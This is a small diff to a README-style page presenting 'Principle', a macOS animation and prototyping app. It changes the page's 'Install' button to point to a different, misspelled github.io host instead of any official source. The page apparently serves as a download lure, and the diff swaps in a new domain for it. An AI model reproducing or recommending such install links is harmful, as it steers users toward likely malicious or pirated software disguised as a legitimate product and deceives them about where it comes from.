@@ -6,7 +6,7 @@
 <h3>Principle - design animation tool</h3>
 <p>Principle is a professional interactive animation and UI prototyping application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/pr)
 </div>
 <br/><br>
 
